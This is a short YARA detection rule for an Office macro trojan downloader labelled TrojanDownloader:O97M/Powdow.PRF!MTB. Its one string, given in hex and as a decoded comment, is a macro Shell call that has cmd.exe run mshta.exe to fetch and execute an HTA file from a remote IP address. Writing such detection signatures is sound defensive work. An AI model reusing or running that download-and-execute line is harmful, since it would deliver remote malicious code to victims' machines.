
rule TrojanDownloader_O97M_Powdow_PRF_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.PRF!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 "
		
	strings :
		$a_01_0 = {53 68 65 6c 6c 28 22 63 6d 64 2e 65 78 65 20 2f 53 20 2f 63 22 20 26 20 22 6d 73 68 74 61 2e 65 78 65 20 68 74 74 70 3a 2f 2f 31 38 35 2e 34 38 2e 36 34 2e 31 36 30 3a 38 30 38 30 2f 79 71 46 30 57 61 34 32 69 53 2e 68 74 61 22 2c 20 76 62 4e 6f 72 6d 61 6c 46 6f 63 75 73 29 } //1 Shell("cmd.exe /S /c" & "mshta.exe http://185.48.64.160:8080/yqF0Wa42iS.hta", vbNormalFocus)
	condition:
		((#a_01_0  & 1)*1) >=1
 
}